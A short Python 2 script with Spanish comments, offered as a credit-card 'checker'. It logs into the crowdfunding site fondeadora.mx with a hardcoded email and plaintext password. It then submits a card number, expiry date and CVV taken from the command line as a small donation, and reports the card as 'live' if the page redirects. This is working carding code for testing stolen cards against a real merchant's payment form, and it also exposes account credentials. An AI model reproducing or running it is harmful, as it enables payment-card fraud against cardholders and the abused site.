#usr/bin/python

#El autor original es Zack Dasti ( Chapuawe )
#El script tiene la licencia GNU Public License v3.0
#Cualquiera puede imitar/modificar este script mientras de creditos al autor

import mechanize
import sys

cc = sys.argv[1]
ano = sys.argv[2]
mes = sys.argv[3]
cvv = sys.argv[4]

print "                    	Checker Version Beta 0.2.5 \n";

print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

print "	  ======================================================\n\n";
print "		  Uso: python checker.py cc ano mes cvv\n\n";

br = mechanize.Browser()
response = br.open('https://fondeadora.mx/login.html')

br.select_form(nr=2)

br.form['user[email]'] = 'zackdasti@mail.com'
br.form['user[password]'] = 'joshua75'

br.submit()

response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar')
urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=5&continue=Continuar'
urlpass = br.geturl()

br.select_form(nr=2)

br.form['date[year]'] = [ano]
br.form['date[month]'] = [mes]

br.set_value('Zack Dasti', nr=3)
br.set_value(cc, nr=2)
br.set_value(cvv, nr=6)

br.submit()

if (urlpass != urlchecker):
	print " Felicidadez tienes una cc live , \n paso correctamente los algoritmos :D "

else :
	print " Lo siento mucho pero tu cc no pasa \n por los algoritmos D:"

exit()

#Saludos a todo el chat de administracion de chats de lhg 
#Saludos a el chat # 1 y el chat #5 de lhg
# Y por ultimo saludos a mi bb Andrew Gonzales :3 <3